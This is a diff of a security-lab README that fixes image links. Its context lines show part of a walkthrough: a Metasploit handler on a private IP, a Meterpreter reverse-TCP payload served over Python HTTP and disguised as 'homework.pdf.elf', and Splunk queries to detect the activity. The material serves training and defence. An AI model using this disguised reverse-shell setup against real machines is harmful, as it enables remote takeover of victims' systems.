@@ -96,7 +96,7 @@ set LHOST 192.168.20.11
 exploit
 ```
 - *note that the default payload for exploit/multi/handler is generic/shell_reverse_tcp (see below); explicitly set payload to linux/x64/meterpreter_reverse_tcp.*
-[options](./docs/options.png)
+![options](./docs/options.png)
 
 5. Serve the payload with Python HTTP server
 ```
@@ -110,7 +110,7 @@ chmod +x homework.pdf.elf
 ```
 
 7. After executing the payload, the handler on Kali should show a new Meterpreter session (see below). 
-(handler)[./docs/establish.png]
+![handler](./docs/establish.png)
 
 - In msfconsole you can interact with the Ubunut machine from the attacker machine using `shell` with the following commands:
 ```
@@ -150,7 +150,7 @@ sudo /opt/splunk/bin/splunk restart
 - In Splunk web: Settings → Indexes → Add new index: endpoint (or the name you used).
 
 - Confirm data ingestion by searching the new index: index=endpoint in the Search & Reporting app, the resuilt shoud look like:
-[result](./docs/search1.png)
+![result](./docs/search1.png)
 
 
 2. Example Splunk queries
